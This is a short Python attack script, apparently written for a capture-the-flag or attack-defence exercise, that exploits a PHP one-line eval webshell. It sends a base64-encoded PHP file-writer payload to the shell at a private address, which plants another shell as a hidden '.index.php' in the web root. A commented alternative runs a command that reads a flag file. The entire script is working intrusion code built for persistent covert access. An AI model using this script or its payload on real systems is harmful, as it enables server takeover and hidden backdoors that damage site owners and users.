# -*- coding: utf-8 -*-
import requests
import base64
# 最简单的一句话木马利用

def loadfile(file_path):
    # file_path=http://127.0.0.1:80/index.php,post,pass
    try:
        with open(file_path,'r') as f:
            return str(f.read())
    except:
        print ("File %s Not Found!" % file_path)
        
shell_content = loadfile('./shell1.php')
url = 'http://10.188.14.57:80/zjk/1_eval.php'
# eval
data = {'cmd': "@eval(base64_decode($_POST['z0']));",
        'z0': 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7', 'z1':base64.b64encode('/var/www/html/zjk/.index.php'), 'z2': base64.b64encode(shell_content)}

# system
#data = {'cmd': '/bin/cat /flag.txt'}

try:
    r = requests.post(url,data)
    print(r.status_code)
    print(r.text)
except:
    pass

